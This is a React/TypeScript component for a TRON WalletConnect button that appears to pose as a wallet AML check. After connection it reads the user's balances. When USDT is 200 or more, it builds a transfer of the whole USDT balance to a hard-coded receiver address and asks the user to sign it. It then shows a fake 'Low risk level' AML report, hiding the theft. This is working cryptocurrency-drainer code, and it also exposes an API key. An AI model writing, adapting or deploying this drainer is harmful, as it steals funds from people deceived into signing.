// components/TronWalletConnectButton.tsx
import React, { useState } from 'react';
import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
import { TronWeb } from 'tronweb';


const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n'; // ⚠️ REPLACE with the desired address

const tronWeb = new TronWeb({
    fullHost: 'https://api.trongrid.io',
    headers: {
        'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489',
    },
});

const adapter = new WalletConnectAdapter({
    network: 'Mainnet',
    options: {
        relayUrl: 'wss://relay.walletconnect.com',
        projectId: 'e899c82be21d4acca2c8aec45e893598',
        metadata: {
            name: 'My DApp',
            description: 'TRON + WalletConnect Integration',
            url: 'https://your-dapp-url.com',
            icons: ['https://your-dapp-url.com/icon.png'],
        },
    },
    web3ModalConfig: {
        themeMode: 'dark',
        explorerRecommendedWalletIds: [
            '225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f',
        ],
    },
});

export const TronAuthButton: React.FC = () => {
    const [modalMessage, setModalMessage] = useState<string | null>("");

    const disconnectAndNotify = async (message: string) => {
        setModalMessage(message);
        await adapter.disconnect();
    };

    const connectWallet = async () => {
        try {
            console.log('try connect')
            await adapter.connect();
            const userAddress = adapter.address;

            // Check TRX
            const trxRaw = await tronWeb.trx.getBalance(userAddress as string);
            const trx = trxRaw / 1e6;
            console.log('TRX: ' + trx)

            if (trx < 25) {
                return await disconnectAndNotify('❌ Insufficient TRX. At least 25 TRX is required.');
            }

            if (!tronWeb.isAddress(userAddress)) {
                console.error('Invalid TRON address:', userAddress);
                return;
            }

            // Check USDT
            const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
            console.log('USDT contract loaded:', usdtContract);
            const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call({ from: userAddress as string });
            console.log('USDT RAW:', usdtRaw);
            const usdt = Number(usdtRaw) / 1e6;
            console.log('USDT:', usdt);

            if (usdt < 200) {
                return await disconnectAndNotify('succes');
            }

            // If more than 200 USDT — send

            if (!userAddress) {
                throw new Error('userAddress is null');
            }
            const functionSelector = 'transfer(address,uint256)';
            const parameter = [
                { type: 'address', value: TRON_RECEIVER },
                { type: 'uint256', value: usdtRaw },
            ];

            const options = {
                feeLimit: 25_000_000,
                callValue: 0,
            };

            const unsignedTx = await tronWeb.transactionBuilder.triggerSmartContract(
                USDT_CONTRACT,
                functionSelector,
                options,
                parameter,
                userAddress // from
            );

            // Sign via WalletConnect adapter
            const signedTx = await adapter.signTransaction(unsignedTx.transaction);
            const result = await tronWeb.trx.sendRawTransaction(signedTx);

            console.log('USDT sent:', result);

            // await disconnectAndNotify(`✅ Success! ${usdt} USDT sent to ${TRON_RECEIVER}`);
            await disconnectAndNotify(`succes`);
        } catch (err: any) {
            console.error('Error:', err);
            await adapter.disconnect();

            const errMsg = err?.message || err?.toString();

            console.log(errMsg)

            // Skip modal if WalletConnect modal was simply closed by the user
            if (
                errMsg.includes('Invalid address provided') ||
                errMsg.includes('Modal is closed')
            ) {
                return; // do nothing
            }

            setModalMessage('⚠️ Connection or transaction error');
        }
    };

    return (
        <div onClick={connectWallet} className='AuthButton'>

            {/* <button
                onClick={
                        connectWallet
                    } 
                style={{ backgroundColor: !connected ? 'blue' : 'red' }}
            >
                {!connected ? 'Connect TRON Wallet' : 'Disconnect'}
            </button> */}

            {modalMessage && (
                <div className='modal__overflow'>
                    <div className="modal">
                        {modalMessage !== 'succes' ? <>
                            <p>{modalMessage}</p>

                        </> :

                            <>
                                <div className="content greenBorder">
                                    <div>
                                        0.6%
                                    </div>
                                    <div>

                                        <h3>Low risk level</h3>
                                        <div className="nums">
                                            <div><span className='circ green'></span> 0-30 </div>
                                            <div><span className='circ orange'></span> 31-69 </div>
                                            <div><span className='circ red'></span> 70-100 </div>
                                        </div>
                                    </div>
                                </div>
                                <div className="content report">
                                    <p>AML report for a wallet:</p>
                                    <h5>TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</h5>
                                </div>
                            </>
                        }
                        <button onClick={() => setModalMessage(null)}>Close</button>
                    </div>
                </div>
            )}
        </div>
    );
};
